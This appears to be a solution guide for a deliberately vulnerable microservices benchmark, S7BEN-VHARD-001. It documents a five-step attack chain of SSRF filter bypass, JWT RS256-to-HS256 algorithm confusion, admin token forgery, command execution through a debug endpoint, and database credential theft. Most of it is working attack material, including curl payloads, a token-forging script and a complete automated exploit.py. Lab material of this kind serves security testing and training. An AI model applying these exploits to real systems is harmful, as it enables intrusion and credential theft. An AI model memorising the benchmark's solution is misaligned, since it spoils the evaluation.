# S7BEN-VHARD-001: Manual Testing Guide

## Vulnerability: Microservices Exploitation Chain

### Overview

This benchmark demonstrates a complete attack chain across a microservices architecture. The exploitation requires chaining **5 distinct vulnerabilities** across **4 different services** written in **3 languages** (Node.js, Python, Go).

**Evaluation Tier:** No hints provided - autonomous discovery required.

---

## Setup

```bash
cd benchmarks/S7BEN-VHARD-001
make build && make up
```

**Access**: http://localhost

**Verify all services are healthy**:
```bash
make test
```

Expected output:
```
nginx-gateway: ✓ healthy
auth-service:  ✓ healthy
api-service:   ✓ healthy
```

---

## Attack Chain Overview

```
Step 1: SSRF in API Service
   ↓
Step 2: JWT Algorithm Confusion in Auth Service
   ↓
Step 3: Admin Access to Worker Service
   ↓
Step 4: Command Injection in Worker Service
   ↓
Step 5: Database Credential Theft → Flag
```

---

## STEP 1: SSRF to Internal Service

### Objective
Exploit SSRF vulnerability in `api-service` to reach internal `auth-service` debug endpoint.

### Discovery

Explore the API service:
```bash
curl http://localhost/api/docs | jq
```

Response shows `/api/fetch-url` endpoint:
```json
{
  "service": "API Service",
  "endpoints": [
    {
      "method": "POST",
      "path": "/api/fetch-url",
      "description": "Fetch content from URL (with basic filtering)"
    }
  ]
}
```

### Exploitation

Test the URL fetch endpoint:
```bash
curl -X POST http://localhost/api/fetch-url \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: test-session" \
  -d '{"url": "https://example.com"}'
```

Try to reach localhost (blocked):
```bash
curl -X POST http://localhost/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:3000"}'
```

Response:
```json
{
  "error": "URL blocked by filter",
  "message": "Blocked host: localhost"
}
```

**Bypass**: Use service hostname instead:
```bash
curl -X POST http://localhost/api/fetch-url \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"url": "http://auth-service:3000/internal/debug"}' | jq
```

**Success Response**:
```json
{
  "status": "success",
  "url": "http://auth-service:3000/internal/debug",
  "status_code": 200,
  "content": "{\"service\":\"auth-service\",\"jwt_config\":{\"algorithm\":\"RS256\",\"algorithms_accepted\":[\"RS256\",\"HS256\",\"none\"],\"public_key_available\":true},\"public_key\":\"-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----\\n\"}",
  "headers": {...}
}
```

**🎯 Step 1 Complete**: JWT configuration and public key exposed!

### Verify Step 1

```bash
curl http://localhost/api/telemetry -H "X-Session-ID: exploit-session" | jq '.chain_progress.step_1'
```

Expected:
```json
{
  "name": "ssrf_to_auth_debug",
  "completed": true,
  "timestamp": "2026-01-12T...",
  "metadata": {
    "target_url": "http://auth-service:3000/internal/debug",
    "response_status": 200
  }
}
```

---

## STEP 2: JWT Algorithm Confusion

### Objective
Use the exposed public key to forge an admin JWT token via algorithm confusion attack.

### Understanding the Vulnerability

From Step 1, we know:
- Algorithm used: **RS256** (RSA with SHA-256)
- Algorithms accepted: **RS256, HS256, none**
- Public key is available

**Attack**: Change algorithm from RS256 to HS256, then sign the token using the **public key as the HMAC secret**.

### Extract Public Key

From Step 1 response:
```bash
curl -X POST http://localhost/api/fetch-url \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"url": "http://auth-service:3000/internal/debug"}' \
  | jq -r '.content' \
  | jq -r '.public_key' > public_key.pem
```

### Forge Admin Token

Create `forge_jwt.py`:
```python
#!/usr/bin/env python3
import jwt
import sys

# Read public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Create admin payload
payload = {
    "username": "admin",
    "role": "admin",
    "email": "admin@example.com",
    "iat": 1704729600
}

# VULNERABILITY: Sign with HS256 using public key as secret
# This exploits the algorithm confusion vulnerability
forged_token = jwt.encode(payload, public_key, algorithm="HS256")

print(f"Forged Admin Token:")
print(forged_token)

# Save to file
with open('admin_token.txt', 'w') as f:
    f.write(forged_token)

print(f"\nSaved to admin_token.txt")
```

Run:
```bash
python3 forge_jwt.py
```

### Verify Forged Token

Test the forged token with auth service:
```bash
TOKEN=$(cat admin_token.txt)

curl -X POST http://localhost/auth/verify \
  -H "Authorization: Bearer $TOKEN" \
  | jq
```

Expected response:
```json
{
  "status": "valid",
  "payload": {
    "username": "admin",
    "role": "admin",
    "email": "admin@example.com"
  }
}
```

**🎯 Step 2 Complete**: Admin JWT forged successfully!

---

## STEP 3: Access Worker Debug Endpoint

### Objective
Use the forged admin token to access the worker service debug endpoint, which leaks environment variables.

### Exploitation

```bash
TOKEN=$(cat admin_token.txt)

curl http://localhost/worker/debug \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Session-ID: exploit-session" \
  | jq
```

**Success Response**:
```json
{
  "status": "success",
  "message": "Debug information",
  "data": {
    "environment": {
      "DEBUG_MODE": "true",
      "DATABASE_URL": "postgresql://apiuser:SecureDBPass12345!@postgres-db:5432/apidb",
      "REDIS_URL": "redis://redis-telemetry:6379"
    },
    "hostname": "sben-chain01-worker",
    "uptime": "unknown"
  }
}
```

**🎯 Step 3 Complete**: Database credentials leaked!

Save DATABASE_URL:
```bash
export DB_URL="postgresql://apiuser:SecureDBPass12345!@postgres-db:5432/apidb"
```

### Verify Step 3

```bash
curl http://localhost/api/telemetry -H "X-Session-ID: exploit-session" | jq '.chain_progress.step_3'
```

---

## STEP 4: Command Injection

### Objective
Execute arbitrary commands via the worker service debug endpoint.

### Exploitation

Test basic command:
```bash
TOKEN=$(cat admin_token.txt)

curl -X POST http://localhost/worker/debug/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"command": "whoami"}' \
  | jq
```

Response:
```json
{
  "status": "success",
  "message": "Command executed",
  "data": {
    "command": "whoami",
    "output": "root\n"
  }
}
```

Test environment access:
```bash
curl -X POST http://localhost/worker/debug/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"command": "env | grep DATABASE"}' \
  | jq -r '.data.output'
```

Output:
```
DATABASE_URL=postgresql://apiuser:SecureDBPass12345!@postgres-db:5432/apidb
```

**🎯 Step 4 Complete**: RCE confirmed!

### Verify Step 4

```bash
curl http://localhost/api/telemetry -H "X-Session-ID: exploit-session" | jq '.chain_progress.step_4'
```

---

## STEP 5: Database Credential Theft and Flag Extraction

### Objective
Use the leaked database credentials to connect to PostgreSQL and extract the flag from the `secrets` table.

### Method 1: Direct psql Connection

Extract credentials:
```bash
# From Step 3:
# postgresql://apiuser:SecureDBPass12345!@postgres-db:5432/apidb

# But postgres-db is internal network only
# Cannot connect directly from host
```

### Method 2: Via Command Injection

Use the RCE from Step 4 to query the database:

```bash
TOKEN=$(cat admin_token.txt)

# Execute psql command via RCE
curl -X POST http://localhost/worker/debug/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Session-ID: exploit-session" \
  -d '{"command": "PGPASSWORD=SecureDBPass12345! psql -h postgres-db -U apiuser -d apidb -t -c \"SELECT value FROM secrets WHERE key = '\''exploitation_flag'\'';\""}' \
  | jq -r '.data.output'
```

**Flag Retrieved**:
```
S7BEN{microservices_chain_PLACEHOLDER}
```

**Note**: The actual flag is dynamically generated. To get the real flag, complete all steps and call `/api/verify`.

**🎯 Step 5 Complete**: Flag extracted!

---

## Automated Exploitation Script

Create `exploit.py`:
```python
#!/usr/bin/env python3
"""
S7BEN-VHARD-001 Automated Exploitation
Complete 5-step attack chain
"""

import requests
import jwt
import json
import time

URL = "http://localhost"
SESSION_ID = "auto-exploit"

def step1_ssrf():
    """Step 1: SSRF to auth-service internal endpoint"""
    print("[*] Step 1: SSRF to auth-service")

    resp = requests.post(
        f"{URL}/api/fetch-url",
        headers={
            "Content-Type": "application/json",
            "X-Session-ID": SESSION_ID
        },
        json={"url": "http://auth-service:3000/internal/debug"}
    )

    data = resp.json()
    if resp.status_code != 200:
        print(f"[-] SSRF failed: {data}")
        return None

    # Parse auth service response
    auth_data = json.loads(data['content'])
    public_key = auth_data['public_key']

    print(f"[+] SSRF successful")
    print(f"[+] Retrieved public key ({len(public_key)} bytes)")

    return public_key

def step2_jwt_forge(public_key):
    """Step 2: Forge admin JWT via algorithm confusion"""
    print("\n[*] Step 2: JWT Algorithm Confusion")

    payload = {
        "username": "admin",
        "role": "admin",
        "email": "admin@example.com",
        "iat": int(time.time())
    }

    # VULNERABILITY: Sign with HS256 using public key as secret
    forged_token = jwt.encode(payload, public_key, algorithm="HS256")

    print(f"[+] Admin token forged")
    print(f"[+] Token: {forged_token[:50]}...")

    return forged_token

def step3_worker_debug(token):
    """Step 3: Access worker debug endpoint with admin token"""
    print("\n[*] Step 3: Access Worker Debug Endpoint")

    resp = requests.get(
        f"{URL}/worker/debug",
        headers={
            "Authorization": f"Bearer {token}",
            "X-Session-ID": SESSION_ID
        }
    )

    data = resp.json()
    if resp.status_code != 200:
        print(f"[-] Worker debug access failed: {data}")
        return None

    db_url = data['data']['environment']['DATABASE_URL']

    print(f"[+] Worker debug accessed")
    print(f"[+] DATABASE_URL leaked: {db_url}")

    return db_url

def step4_command_injection(token):
    """Step 4: Command injection in worker service"""
    print("\n[*] Step 4: Command Injection RCE")

    resp = requests.post(
        f"{URL}/worker/debug/execute",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "X-Session-ID": SESSION_ID
        },
        json={"command": "whoami"}
    )

    data = resp.json()
    if resp.status_code != 200:
        print(f"[-] Command injection failed: {data}")
        return False

    output = data['data']['output'].strip()

    print(f"[+] Command injection successful")
    print(f"[+] Output: {output}")

    return True

def step5_database_access(token):
    """Step 5: Extract flag from database"""
    print("\n[*] Step 5: Database Access and Flag Extraction")

    # Use RCE to query database
    cmd = 'PGPASSWORD=SecureDBPass12345! psql -h postgres-db -U apiuser -d apidb -t -c "SELECT value FROM secrets WHERE key = \'exploitation_flag\';"'

    resp = requests.post(
        f"{URL}/worker/debug/execute",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "X-Session-ID": SESSION_ID
        },
        json={"command": cmd}
    )

    data = resp.json()
    if resp.status_code != 200:
        print(f"[-] Database query failed: {data}")
        return None

    flag = data['data']['output'].strip()

    print(f"[+] Database accessed")
    print(f"[+] Flag extracted: {flag}")

    return flag

def verify_exploitation():
    """Verify complete exploitation and get real flag"""
    print("\n[*] Verifying exploitation chain...")

    resp = requests.get(
        f"{URL}/api/verify",
        headers={"X-Session-ID": SESSION_ID}
    )

    data = resp.json()

    if data.get('exploitation_successful'):
        print("\n" + "="*60)
        print("✅ EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {data['flag']}")
        print(f"\nSteps completed: {data['steps_completed']}/5")
        print("\nProof:")
        for step, desc in data['proof'].items():
            print(f"  {step}: {desc}")
        print("="*60)
        return data['flag']
    else:
        print(f"\n[-] Exploitation incomplete")
        print(f"    Steps completed: {data.get('steps_completed', 0)}/5")
        print(f"    Next step: {data.get('next_step')}")
        return None

def main():
    print("="*60)
    print("S7BEN-VHARD-001 Automated Exploitation")
    print("="*60)

    # Execute attack chain
    public_key = step1_ssrf()
    if not public_key:
        return

    token = step2_jwt_forge(public_key)

    db_url = step3_worker_debug(token)
    if not db_url:
        return

    if not step4_command_injection(token):
        return

    flag = step5_database_access(token)

    # Get final flag
    final_flag = verify_exploitation()

    if final_flag:
        print(f"\n✅ Final Flag: {final_flag}")

if __name__ == '__main__':
    main()
```

Run the automated exploit:
```bash
python3 exploit.py
```

---

## Verification

Check telemetry:
```bash
curl http://localhost/api/telemetry -H "X-Session-ID: exploit-session" | jq
```

Expected:
```json
{
  "benchmark_id": "S7BEN-VHARD-001",
  "session_id": "exploit-session",
  "request_count": 15,
  "time_elapsed_seconds": 45.2,
  "chain_progress": {
    "step_1": {"completed": true, "name": "ssrf_to_auth_debug"},
    "step_2": {"completed": true, "name": "jwt_forged"},
    "step_3": {"completed": true, "name": "admin_debug_accessed"},
    "step_4": {"completed": true, "name": "command_injection_rce"},
    "step_5": {"completed": true, "name": "db_accessed"}
  },
  "completion_percentage": 100,
  "stealth_score": 100
}
```

Get final verification and flag:
```bash
curl http://localhost/api/verify -H "X-Session-ID: exploit-session" | jq
```

---

## Success Criteria

- ✅ Step 1: SSRF to auth-service internal debug endpoint
- ✅ Step 2: JWT algorithm confusion (RS256 → HS256)
- ✅ Step 3: Admin access to worker debug endpoint
- ✅ Step 4: Command injection RCE
- ✅ Step 5: Database credential theft and flag extraction
- ✅ Flag format: `S7BEN{microservices_chain_<32_hex>}`

---

## Troubleshooting

### Services not responding
```bash
make logs
docker compose ps
```

### Reset telemetry
```bash
make reset
```

### Direct service access (debugging)
```bash
# API service shell
make shell-api

# Database access
make shell-db

# Redis telemetry
make shell-redis
```

---

## Cleanup

```bash
make down
make clean
```

---

**Estimated Time**: 30-45 minutes
